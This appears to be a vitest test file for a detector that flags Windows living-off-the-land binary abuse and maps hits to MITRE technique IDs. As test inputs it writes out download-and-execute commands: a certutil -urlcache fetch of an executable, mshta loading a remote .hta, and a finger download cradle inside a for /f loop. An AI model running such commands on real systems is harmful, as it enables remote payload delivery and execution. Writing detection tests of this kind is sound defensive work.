import { describe, expect, it } from 'vitest'
import { matchLolbin } from '../lolbins'
import { buildContext } from '../techniques'
import { preprocess } from '../preprocess'

function ctx(text: string, raw = text) {
  return buildContext(text, preprocess(raw).flags)
}

describe('matchLolbin', () => {
  it('hits certutil used as a downloader (-urlcache http)', () => {
    const r = matchLolbin(ctx("certutil.exe -urlcache -split -f http://45.9.148.20/a.exe a.exe"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1105')
    expect(r.trigger?.toLowerCase()).toContain('certutil')
  })

  it('hits mshta launching a remote payload', () => {
    const r = matchLolbin(ctx("mshta http://evil.test/x.hta"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1218.005')
  })

  it('does NOT hit certutil doing legitimate cert work (no URL / download verb)', () => {
    const r = matchLolbin(ctx("certutil -hashfile payload.bin SHA256"))
    expect(r.hit).toBe(false)
  })

  it('does NOT hit prose that merely mentions a binary name', () => {
    const r = matchLolbin(ctx("Write-Host 'run regsvr32 to register the dll'"))
    expect(r.hit).toBe(false)
  })

  it('does NOT hit certutil -decode (a local, non-download/exec deobfuscation op)', () => {
    const r = matchLolbin(ctx('certutil -decode payload.b64 out.exe'))
    expect(r.hit).toBe(false)
  })
})

describe('finger LOLBin', () => {
  it('hits finger used as a download cradle inside a for /f loop', () => {
    const r = matchLolbin(ctx("for /f %e in ('finger user@45.9.148.20') do %e"))
    expect(r.hit).toBe(true)
    expect(r.techniqueIds).toContain('T1105')
  })

  it('does NOT hit a bare finger command (no discriminator)', () => {
    const r = matchLolbin(ctx('finger user@example.com'))
    expect(r.hit).toBe(false)
  })
})
